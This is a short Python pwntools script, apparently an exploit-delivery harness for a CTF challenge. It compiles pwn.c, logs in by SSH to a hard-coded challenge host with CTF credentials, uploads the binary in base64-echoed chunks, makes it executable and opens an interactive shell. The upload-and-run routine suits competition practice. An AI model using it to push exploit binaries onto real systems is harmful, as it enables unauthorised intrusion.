#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "35.197.193.43"
PORT = 10000

USER = "ctf"
PW = "wolfie"

START_SCRIPT = "./run.sh"
DEBUG_SCRIPT = START_SCRIPT+".debug"
REMOTE_SCRIPT = START_SCRIPT

#PROMPT = "# "
PROMPT = "$ "
PKGSIZE = 300


def compile():
    log.info("Compile")
    res = os.system("musl-gcc -w -s -static -o3 pwn.c -o pwn -masm=intel")

    return res == 0


def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil(PROMPT)


def upload(filename):
    p = log.progress("Upload")

    with open(filename, "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    current = 0
    total_len = len(encoded)

    while current < total_len:
        size = total_len-current

        if size > PKGSIZE:
            size = PKGSIZE

        p.status("%d / %d" % (current, total_len))
        exec_cmd("echo %s >> %s.b64" %
                 (encoded[current:current+size], filename))

        current += size

    exec_cmd("cat %s.b64 | base64 -d > %s" % (filename, filename))
    exec_cmd("chmod +x %s" % filename)

    p.success()


def exploit(r):
    log.info("Booting")

    r.recvuntil(PROMPT)
    exec_cmd("cd /home/user")    
    upload("pwn")

    r.interactive()

    return


if __name__ == "__main__":
    if not compile():
        exit()

    if len(sys.argv) > 1:
        if sys.argv[1] == 'd':
            r = process(DEBUG_SCRIPT)
            exploit(r)
        else:
            session = ssh(USER, HOST, PORT, PW)
            r = session.shell(None)
            r.recvuntil("exploit): ")            
            r.sendline("")
            exploit(r)
    else:
        LOCAL = True
        r = process(START_SCRIPT)
        print util.proc.pidof(r)
        pause()
        exploit(r)
